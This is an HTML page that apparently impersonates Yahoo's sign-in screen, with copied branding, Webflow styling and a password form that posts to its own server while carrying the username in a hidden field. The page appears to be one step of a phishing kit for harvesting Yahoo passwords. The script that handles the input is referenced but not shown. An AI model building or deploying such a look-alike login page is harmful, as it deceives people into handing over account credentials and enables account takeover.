<!DOCTYPE html>

<head>
  <meta charset="utf-8">
  <title>Sign in to Yahoo</title>
  <meta content="Sign in to Yahoo" property="og:title">
  <meta content="Sign in to Yahoo" property="twitter:title">
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
  <link href="webflow-yahoo.css" rel="stylesheet" type="text/css">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({  google: {    families: ["Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]  }});</script>
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link rel="shortcut icon" href="images/yahoo.png" type="image/x-icon">
  <link rel="apple-touch-icon" href="images/yahoo.png">
</head>
<body>
  <div class="yahoo-container">
    <div class="yahoo-logo">
      <img src="images/yahoo.png" alt="Yahoo" loading="lazy">
    </div>
    
    <div class="yahoo-form">
      <h1 class="yahoo-title">Sign in</h1>
      <p class="yahoo-subtitle">using your Yahoo account</p>
      
      <div id="error-message" class="yahoo-error" style="display: none;"></div>
      
      <form id="password-form" method="POST">
        <input type="hidden" id="username" name="username" value="">
        <input type="password" id="passwd" name="passwd" class="yahoo-input" placeholder="Password" required>
        <button type="submit" class="yahoo-button" id="submit-btn">Next</button>
      </form>
      
      <div style="text-align: center;">
        <a href="#" class="yahoo-link">Forgot password?</a>
      </div>
    </div>
  </div>
  
  <script src="js/yahoo-password.js"></script>
</body>
</html>
